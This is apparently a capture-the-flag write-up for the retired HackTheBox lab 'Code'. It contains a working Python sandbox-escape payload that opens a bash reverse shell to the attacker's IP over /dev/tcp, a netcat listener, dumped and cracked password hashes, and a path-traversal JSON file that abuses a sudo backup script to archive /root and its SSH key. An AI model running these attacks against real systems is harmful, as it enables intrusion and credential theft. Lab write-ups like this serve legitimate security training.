# Machine Information
Machine Name: Code
Machine IP: (Variable at every instance)
Platform: HackTheBox
Difficulty: Easy
Status: Retired

# Reconnaissance
NMap for initial enumeration of available network ports.
sudo nmap -Pn -sVC [IP] --top-ports 10000 -T3 --min-rate 100
[sudo] password for [User]: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 15:07 -0700
Nmap scan report for Code.htb (10.129.231.240)
Host is up (0.17s latency).
Not shown: 8385 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.90 seconds

So we have SSH on port 22 with a specialized HTTP web service on port 5000 using Gunicorn application version 20.0.4.

OSINT suggests Gunicorn is used for Python web server.
https://gunicorn.org/
https://github.com/benoitc/gunicorn

Lets see what we can enumerate for the web server.
ffuf -u 'http://[IP]:5000/FUZZ' -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.231.240:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,500
________________________________________________

about                   [Status: 200, Size: 818, Words: 143, Lines: 23, Duration: 116ms]
codes                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 100ms]
login                   [Status: 200, Size: 730, Words: 103, Lines: 24, Duration: 106ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 102ms]
register                [Status: 200, Size: 741, Words: 103, Lines: 24, Duration: 136ms]
:: Progress: [4750/4750] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:33] :: Errors: 119 ::

Opening the IP with port number from a web browser shows a "Python Code Editor".

So we have a Python web environment to try exploiting for shell access to the target.
OSINT suggests code snippet "().__class__.__bases__[0].__subclasses__()" can be used to escape a python sandbox.
https://hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html

# Initial Access
So, lets try using that.
First, pull our attacker IP.
ip a
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.16.44/23 brd 10.10.17.255 scope global tun0

Now the exploit snippet,
"
raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317](
    "bash -c 'bash -i >& /dev/tcp/10.10.16.44/4444 0>&1'", shell=True, stdout=-1).communicate()))
"

And here is our Netcat listener for a reverse shell from attacker box to target box.

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.44] from (UNKNOWN) [10.129.231.240] 35180
bash: cannot set terminal process group (2496): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$ id
id
uid=1001(app-production) gid=1001(app-production) groups=1001(app-production)
app-production@code:~/app$ ls -l /home/
ls -l /home/
total 8
drwxr-x--- 5 app-production app-production 4096 Sep 16  2024 app-production
drwxr-x--- 6 martin         martin         4096 Apr  8  2025 martin
app-production@code:~/app$ ls /home/martin/
ls /home/martin/
ls: cannot open directory '/home/martin/': Permission denied
app-production@code:~/app$ ls -l /home/app-production/
ls -l /home/app-production/
total 8
drwxrwxr-x 6 app-production app-production 4096 Feb 20  2025 app
-rw-r----- 1 root           app-production   33 Sep 19 18:36 user.txt
app-production@code:~/app$ cat /home/app-production/user.txt
cat /home/app-production/user.txt
[redacted]
app-production@code:~/app$ 

Ok, we got the user flag.

Time to get user access, SSH if we find credentials for persistence.
First, explore the machine and enumerate what we can.

app-production@code:~/app$ ls -l /home/
ls -l /home/
total 8
drwxr-x--- 5 app-production app-production 4096 Sep 16  2024 app-production
drwxr-x--- 6 martin         martin         4096 Apr  8  2025 martin
app-production@code:~/app$ uname -a
uname -a
Linux code 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
app-production@code:~/app$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
app-production@code:~/app$ find / -writable -type f 2>/dev/null | grep -Ev '^/proc|^/sys'
<table -type f 2>/dev/null | grep -Ev '^/proc|^/sys'
/home/app-production/.profile
/home/app-production/.cache/motd.legal-displayed
/home/app-production/.bash_logout
/home/app-production/.bashrc
/home/app-production/app/app.py
/home/app-production/app/static/css/styles.css
/home/app-production/app/templates/index.html
/home/app-production/app/templates/codes.html
/home/app-production/app/templates/register.html
/home/app-production/app/templates/login.html
/home/app-production/app/templates/about.html
/home/app-production/app/__pycache__/app.cpython-38.pyc
/home/app-production/app/instance/database.db
app-production@code:~/app$ 

The database.db" looks interesting.

app-production@code:~/app$ cd /home/app-production/app/instance/           
cd /home/app-production/app/instance/
app-production@code:~/app/instance$ sqlite3 database.db
sqlite3 database.db
.tables
code  user
SELECT * FROM USER;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be

Time to crack the Hash for user martin.

https://crackstation.net/
3de6f30c4a09c27fc71932bfc68474be -> nafeelswordsmaster

Now to SSH as user martin into target box.

ssh martin@[IP]
The authenticity of host '[IP] ([IP])' can't be established.
ED25519 key fingerprint is: SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[IP]' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
martin@[IP]'s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 19 Sep 2026 10:59:15 PM UTC

  System load:           0.0
  Usage of /:            51.5% of 5.33GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             234
  Users logged in:       0
  IPv4 address for eth0: [IP]
  IPv6 address for eth0: dead:beef::a0de:adff:fe95:4693


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Sep 19 22:59:15 2026 from 10.10.16.44
martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
martin@code:~$ ls -l /home/martin/
total 4
drwxr-xr-x 2 martin martin 4096 Sep 19 22:50 backups
martin@code:~$ ls -l /home/martin/backups/
total 12
-rw-r--r-- 1 martin martin 5879 Sep 19 23:00 code_home_app-production_app_2024_August.tar.bz2
-rw-r--r-- 1 martin martin  181 Sep 19 23:00 task.json
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
martin@code:~$ 

Lets take a look at this backy.sh file, could be our PrivEsc point.

# Privilege Escalation
martin@code:~$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
martin@code:~$ ls -l /usr/bin/backy
-rwxr-xr-x 1 root root 2875189 Aug 26  2024 /usr/bin/backy
martin@code:~$ cat /home/martin/backups/task.json
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
martin@code:~$ 

backy runs as root and we can use user martin to run backy without elevated credentials.
backy uses json format. So if we inject instructions, we can get PrivEsc as root.
Now for Root for the flag.

martin@code:~$ cat > root-steal.json << EOF
> {
>   "destination": "/home/martin/",
>   "multiprocessing": true,
>   "verbose_log": true,
>   "directories_to_archive": [
>     "/home/....//root/"
>   ]
> }
> EOF
martin@code:~$ sudo /usr/bin/backy.sh root-steal.json
2026/09/19 23:11:13 🍀 backy 1.2
2026/09/19 23:11:13 📋 Working with root-steal.json ...
2026/09/19 23:11:13 💤 Nothing to sync
2026/09/19 23:11:13 📤 Archiving: [/home/../root]
2026/09/19 23:11:13 📥 To: /home/martin ...
2026/09/19 23:11:13 📦
tar: Removing leading `/home/../' from member names
/home/../root/
/home/../root/.local/
/home/../root/.local/share/
/home/../root/.local/share/nano/
/home/../root/.local/share/nano/search_history
/home/../root/.selected_editor
/home/../root/.sqlite_history
/home/../root/.profile
/home/../root/scripts/
/home/../root/scripts/cleanup.sh
/home/../root/scripts/backups/
/home/../root/scripts/backups/task.json
/home/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
/home/../root/scripts/database.db
/home/../root/scripts/cleanup2.sh
/home/../root/.python_history
/home/../root/root.txt
/home/../root/.cache/
/home/../root/.cache/motd.legal-displayed
/home/../root/.ssh/
/home/../root/.ssh/id_rsa
/home/../root/.ssh/authorized_keys
/home/../root/.bash_history
/home/../root/.bashrc
martin@code:~$ ls -l
total 24
drwxr-xr-x 2 martin martin  4096 Sep 19 23:10 backups
-rw-r--r-- 1 root   root   12874 Sep 19 23:11 code_home_.._root_2026_September.tar.bz2
-rw-rw-r-- 1 martin martin   143 Sep 19 23:11 root-steal.json
martin@code:~$ cat root-steal.json 
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/../root/"
  ]
}
martin@code:~$ ls -al
total 56
drwxr-x--- 6 martin martin  4096 Sep 19 23:11 .
drwxr-xr-x 4 root   root    4096 Aug 27  2024 ..
drwxr-xr-x 2 martin martin  4096 Sep 19 23:10 backups
lrwxrwxrwx 1 root   root       9 Aug 27  2024 .bash_history -> /dev/null
-rw-r--r-- 1 martin martin   220 Aug 27  2024 .bash_logout
-rw-r--r-- 1 martin martin  3771 Aug 27  2024 .bashrc
drwx------ 2 martin martin  4096 Sep 19 23:10 .cache
-rw-r--r-- 1 root   root   12874 Sep 19 23:11 code_home_.._root_2026_September.tar.bz2
drwxrwxr-x 2 martin martin  4096 Feb 17  2025 .local
-rw-r--r-- 1 martin martin   807 Aug 27  2024 .profile
lrwxrwxrwx 1 root   root       9 Aug 27  2024 .python_history -> /dev/null
-rw-rw-r-- 1 martin martin   143 Sep 19 23:11 root-steal.json
lrwxrwxrwx 1 root   root       9 Aug 27  2024 .sqlite_history -> /dev/null
drwx------ 2 martin martin  4096 Sep 16  2024 .ssh
martin@code:~$ tar -xvf code_home_.._root_2026_September.tar.bz2 
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
martin@code:~$ ls
backups  code_home_.._root_2026_September.tar.bz2  root  root-steal.json
martin@code:~$ cat root/root.txt 
[redacted]
martin@code:~$ 

We got the root flag now. Box is completed.